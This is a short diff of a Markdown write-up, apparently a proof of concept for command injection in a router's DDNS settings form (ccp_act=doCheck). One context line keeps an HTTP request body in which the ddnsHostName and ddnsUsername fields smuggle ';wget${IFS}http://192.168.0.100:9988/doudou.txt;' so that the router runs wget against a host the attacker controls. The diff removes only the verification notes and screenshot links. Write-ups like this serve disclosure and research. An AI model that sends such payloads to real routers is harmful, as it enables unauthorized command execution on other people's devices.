@@ -60,17 +60,3 @@ Cookie: hasLogin=1
 
 ccp_act=doCheck&ddnsHostName=;wget${IFS}http://192.168.0.100:9988/doudou.txt;&ddnsUsername=;wget${IFS}http://192.168.0.100:9988/doudou.txt;&ddnsPassword=123123123
 ```
-
-#### TEXT
-
-​	Local listening port 9988
-
-![image-20211219003400865](./img/image-20211219003400865.png)
-
-​	Send the following packets
-
-​	![image-20211219003610213](./img/image-20211219003610213.png)
-
-​	HTTP requests from routers can be received locally	
-
-![image-20211219003729282](./img/image-20211219003729282.png)
